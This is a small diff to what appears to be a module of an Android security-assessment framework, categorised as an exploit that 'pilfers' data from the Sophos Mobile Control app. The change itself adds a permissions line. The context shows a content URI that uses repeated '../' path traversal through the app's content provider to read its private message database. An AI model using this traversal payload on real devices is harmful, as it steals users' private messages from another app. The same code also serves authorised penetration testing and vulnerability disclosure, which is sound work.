@@ -13,6 +13,7 @@ class Messages(Module, common.Provider, common.ClassLoader):
     date = "2012-12-19"
     license = "MWR Code License"
     path = ["exploit", "pilfer", "thirdparty", "sophos", "mobilecontrol"]
+    permissions = ["com.mwr.dz.permissions.GET_CONTEXT"]
     
     __content_uri = "content://com.sophos.mobilecontrol.client.android.files/../../../../../../../../../../../../..//data/data/com.sophos.mobilecontrol.client.android/databases/message.db"
     
